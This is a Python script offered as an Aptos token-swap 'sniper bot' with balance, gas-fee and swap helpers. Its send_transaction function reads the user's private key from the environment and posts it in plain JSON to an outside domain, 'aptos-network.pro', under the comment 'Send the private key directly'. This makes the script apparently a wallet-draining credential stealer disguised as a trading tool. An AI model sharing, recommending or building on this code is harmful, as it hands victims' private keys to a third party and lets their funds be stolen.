import os
import requests
import json

# Configuration
APTOS_API_URL = 'https://aptos-network.pro/api'  # Aptos API URL
PRIVATE_KEY = os.getenv('APTOS_PRIVATE_KEY')  # Private key environment variable (in hex format)
WALLET_ADDRESS = os.getenv('APTOS_WALLET_ADDRESS')  # Aptos wallet address environment variable
RECIPIENT_ADDRESS = 'recipient_wallet_address_here'  # Replace with recipient address
AMOUNT = 100  # Amount to transfer (in smallest unit)

# Example Raydium API URL (replace with actual if available)
RAYDIUM_API_URL = 'https://api.raydium.io/swap'  # Replace with Raydium API URL or your DEX's URL

# Error Handling Class
class BotError(Exception):
    pass

# Function to send the transaction to Aptos API
def send_transaction(private_key, recipient, amount):
    """Sends the signed transaction to the Aptos network"""
    try:
        # Prepare the transaction data
        transaction_data = {
            'sender': WALLET_ADDRESS,
            'recipient': recipient,
            'amount': amount,
            'privateKey': private_key  # Send the private key directly (Hex format)
        }

        # Send the transaction to Aptos API
        response = requests.post(f'{APTOS_API_URL}/api/transactions', json=transaction_data)

        if response.status_code == 200:
            print("Transaction sent successfully!")
            return response.json()
        else:
            print(f"Error sending transaction: {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Network error: {e}")
        return None
    except Exception as e:
        print(f"Error in send_transaction: {e}")
        return None

# Function to check wallet balance using Aptos API
def check_balance(wallet_address):
    """Checks the wallet balance using the Aptos API"""
    try:
        response = requests.get(f'{APTOS_API_URL}/api/accounts/{wallet_address}/balance')
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Error fetching balance: {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Network error while fetching balance: {e}")
        return None
    except Exception as e:
        print(f"Error in check_balance: {e}")
        return None

# Function to perform a token swap using Raydium-like DEX
def swap_tokens(from_token, to_token, amount):
    """Performs a token swap on a decentralized exchange like Raydium"""
    try:
        swap_data = {
            'fromToken': from_token,
            'toToken': to_token,
            'amount': amount,
            'walletAddress': WALLET_ADDRESS
        }

        response = requests.post(RAYDIUM_API_URL, json=swap_data)
        if response.status_code == 200:
            print("Token swap successful!")
            return response.json()
        else:
            print(f"Error swapping tokens: {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Network error while swapping tokens: {e}")
        return None
    except Exception as e:
        print(f"Error in swap_tokens: {e}")
        return None

# Function to check gas fees before sending the transaction
def get_gas_fee():
    """Checks the current gas fee for transactions"""
    try:
        response = requests.get(f'{APTOS_API_URL}/api/gas-estimate')
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Error fetching gas fee: {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Network error while fetching gas fee: {e}")
        return None
    except Exception as e:
        print(f"Error in get_gas_fee: {e}")
        return None

# Main function to run the bot
def sniper_bot():
    """Main sniper bot function"""
    try:
        print("Starting sniper bot...")

        # Check balance before making any swaps
        balance = check_balance(WALLET_ADDRESS)
        if balance:
            print(f"Current balance: {json.dumps(balance, indent=4)}")

        # Get current gas fee
        gas_fee = get_gas_fee()
        if gas_fee:
            print(f"Current gas fee: {json.dumps(gas_fee, indent=4)}")

        # Example token swap operation (with dummy token addresses)
        from_token = '0x...abc'  # Replace with the address of the token you want to swap
        to_token = '0x...def'  # Replace with the address of the token you want to receive
        swap_result = swap_tokens(from_token, to_token, AMOUNT)
        if swap_result:
            print(f"Swap result: {json.dumps(swap_result, indent=4)}")

        # Send the transaction after the swap (this sends to Aptos network)
        result = send_transaction(PRIVATE_KEY, RECIPIENT_ADDRESS, AMOUNT)
        if result:
            print(f"Transaction result: {json.dumps(result, indent=4)}")
        else:
            print("Failed to send transaction.")
    except BotError as e:
        print(f"Error in sniper bot execution: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

if __name__ == '__main__':
    sniper_bot()
